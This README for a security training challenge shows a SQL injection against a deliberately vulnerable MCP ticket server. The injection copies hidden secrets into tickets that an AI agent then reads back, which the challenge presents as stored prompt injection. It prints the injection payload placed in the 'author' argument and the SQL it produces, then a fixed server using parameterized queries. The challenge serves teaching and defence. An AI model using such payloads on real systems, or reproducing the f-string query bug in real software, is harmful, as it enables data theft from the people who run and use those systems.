# Challenge 07: SQL Injection to Stored Prompt Injection
https://www.trendmicro.com/pl_pl/research/25/f/why-a-classic-mcp-server-vulnerability-can-undermine-your-entire-ai-agent.html

This challenge demonstrates a **two-stage attack chain**:

1. **SQL Injection** - The vulnerable server uses f-string interpolation to build INSERT statements, allowing attackers to inject arbitrary SQL
2. **Stored Prompt Injection** - Leaked secrets are stored in the tickets table where the AI reads them via `summarize_all_tickets()`, causing downstream prompt injection

The vulnerability recreates Anthropic's SQLite reference bug. An attacker can rewrite SQL statements to exfiltrate data from the hidden `incident_intel` table, then have the AI unwittingly read and act on the leaked secrets.

## Running the Challenge

### Local Python
```bash
cd challenges/07-classic-sql-injection-stored-prompt
python -m venv .venv && source .venv/bin/activate  # optional
pip install "mcp[cli]" fastapi uvicorn

python vulnerable/server.py  # http://localhost:8000
python secure/server.py      # http://localhost:8000
```

### Docker Compose
From the repo root:
```bash
docker compose up sql-stored-prompt-vulnerable   # http://localhost:9007/mcp/stream
docker compose up sql-stored-prompt-secure       # http://localhost:9907/mcp/stream
```
Point Cursor or any MCP-aware client at the `/mcp/stream` endpoint.

## Exploit Walkthrough (Cursor-Friendly)

1. Connect Cursor to `http://localhost:9007/mcp/stream`.
2. Ask "what tools exist". You should see:
   - `create_ticket(author: str, content: str)`
   - `summarize_all_tickets()`
3. Call `create_ticket` with the following arguments (Cursor lets you paste JSON):
   ```json
   {
     "tool": "create_ticket",
     "arguments": {
       "author": "ops feed', (SELECT payload FROM incident_intel)); --",
       "content": "ignored"
     }
   }
   ```
   The vulnerable server constructs:
   ```sql
   INSERT INTO tickets (author, content)
   VALUES ('ops feed', (SELECT payload FROM incident_intel)); --', 'ignored')
   ```
   SQLite executes the injected `SELECT`, copying the hidden payload into a normal ticket.
4. Immediately call the summarizer:
   ```json
   {
     "tool": "summarize_all_tickets",
     "arguments": {}
   }
   ```
   Cursor's response now includes a ticket such as `- ops feed: FLAG{sql_prompt_injection_leak}`. No extra tools or prompt tricks were needed?the leak came purely from SQL injection.

![alt text](screenshots/image.png)

## Secure Build Behavior

The secure server implements **defense-in-depth** with multiple security layers:

### 1. Input Validation (Defense Layer 1)
```python
MAX_AUTHOR_LENGTH = 100
MAX_CONTENT_LENGTH = 5000

# Validates:
- Empty or whitespace-only inputs
- Length limits to prevent storage bombs
- Strips whitespace before storing
```

### 2. Parameterized Queries (Defense Layer 2 - PRIMARY)
```python
cursor.execute(
    "INSERT INTO tickets (author, content) VALUES (?, ?)",
    (author.strip(), content.strip()),
)
```
SQLite treats the entire payload as data, so the `SELECT` never runs. The SQL injection attempt is stored as a literal string instead of being executed.

### 3. Error Handling (Defense Layer 3)
```python
try:
    with sqlite3.connect(DB_PATH) as conn:  # Context manager for proper cleanup
        cursor.execute(query)
except sqlite3.Error as e:
    log.error("Database error: %s", e)
    return "Error: Unable to create ticket"
```

Repeating the exploit against the secure server:
- **Input validation** rejects extremely long payloads
- **Parameterized queries** treat the SQL injection as literal text
- **Error handling** gracefully handles database issues
- `summarize_all_tickets` shows the exact injection string rather than the leaked FLAG

## Defensive Takeaways

1. **Always use parameterized queries** - Never interpolate user input into SQL strings with f-strings or string concatenation. Parameterized queries are the PRIMARY defense against SQL injection.

2. **Input validation is defense-in-depth** - While parameterized queries prevent SQL injection, input validation provides additional security by:
   - Preventing storage bombs (extremely large inputs)
   - Ensuring data quality (no empty/whitespace-only fields)
   - Creating audit trails (logging rejected attempts)

3. **Use context managers** - Python's `with` statement ensures database connections are properly closed even when errors occur, preventing resource leaks.

4. **Understand the attack chain** - SQL Injection → Data Exfiltration → Stored Prompt Injection. The AI agent becomes an unwitting accomplice by reading and acting on leaked secrets.

5. **Log security events** - Track rejected inputs and database errors for security monitoring and incident response.

This challenge demonstrates how a "simple" write-only tool can become a data-exfiltration vector when SQL injection is ignored, and how the leaked data can then be weaponized through prompt injection when the AI reads it back.
